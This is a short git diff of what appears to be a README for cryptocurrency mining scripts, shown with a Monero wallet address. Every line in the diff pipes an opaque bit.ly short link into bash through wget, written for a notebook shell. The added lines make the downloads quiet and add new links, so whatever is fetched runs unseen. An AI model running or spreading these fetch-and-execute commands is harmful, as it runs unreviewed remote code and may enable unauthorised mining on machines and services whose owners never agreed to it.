@@ -24,17 +24,19 @@ XMR:	44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELq
 
 ## Scripts Direct use
 
-!echo $(wget -O - bit.ly/RV00001 2> lol.out | bash )
+!echo $(wget -q -O - bit.ly/RV00001 2> lol.out | bash )
 
-!echo $(wget -O - bit.ly/IBM0001 2> lol.out | bash )
+!echo $(wget -q -O - bit.ly/RV20001 2> lol.out | bash )
 
-!echo $(wget -O - bit.ly/ET00001 2> lol.out | bash )
+!echo $(wget -q -O - bit.ly/IBM0001 2> lol.out | bash )
 
-!echo $(wget -O - bit.ly/RVET0001 2> lol.out | bash )
+!echo $(wget -q -O - bit.ly/ET00001 2> lol.out | bash )
 
-!echo $(wget -O - bit.ly/XM00001 2> lol.out | bash )
+!echo $(wget -q -O - bit.ly/RVET0001 2> lol.out | bash )
 
-!echo $(wget -O - bit.ly/TEST0001 2> lol.out | bash )
+!echo $(wget -q -O - bit.ly/XM00001 2> lol.out | bash )
+
+!echo $(wget -q -O - bit.ly/TEsT0001 | bash)
 
 
 ## Solo M
